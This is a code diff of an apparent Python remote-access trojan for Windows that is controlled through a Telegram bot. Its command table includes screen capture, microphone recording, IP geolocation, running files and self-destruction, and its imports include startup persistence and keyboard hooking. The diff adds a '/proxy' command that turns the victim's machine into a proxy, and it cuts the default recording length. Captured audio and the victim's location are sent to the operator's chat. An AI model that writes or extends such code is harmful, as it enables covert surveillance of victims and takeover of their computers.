@@ -7,10 +7,12 @@ from json import loads
 from winshell import startup
 from tendo import singleton
 from win32com.client import Dispatch
+import threading
 import pyaudio, wave #/hear
 import telepot, requests
 import os, os.path, platform, ctypes
 import pyHook, pythoncom
+import proxy
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
@@ -32,6 +34,7 @@ functionalities = { '/capture_pc' : '', \
 					'/msg_box':'<text>', \
 					'/pc_info':'', \
 					'/play':'<youtube_videoId>', \
+					'/proxy':'', \
 					'/pwd':'', \
 					'/run_file':'<target_file>', \
 					'/self_destruct':'', \
@@ -132,7 +135,7 @@ def handle(msg):
 				try:
 					SECONDS = int(command.replace('/hear','').strip())
 				except:
-					SECONDS = 30
+					SECONDS = 5
 				 
 				CHANNELS = 2
 				CHUNK = 1024
@@ -163,7 +166,7 @@ def handle(msg):
 				bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
 			elif command == '/ip_info':
 				bot.sendChatAction(chat_id, 'find_location')
-				info = requests.get('http://ipinfo.io').text
+				info = requests.get('http://ipinfo.io').text #json format
 				response = info
 				location = (loads(info)['loc']).split(',')
 				bot.sendLocation(chat_id, location[0], location[1])
@@ -209,6 +212,11 @@ def handle(msg):
 						response = 'Failed playing YouTube video'
 				else:
 					response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
+			elif command == '/proxy':#WIP
+				threading.Thread(target=proxy.main).start()
+				info = requests.get('http://ipinfo.io').text #json format
+				ip = (loads(info)['ip'])
+				# response = 'Proxy succesfully setup on port ' + ip + ':80'
 			elif command == '/pwd':
 				response = os.getcwd()
 			elif command.startswith('/run_file'):
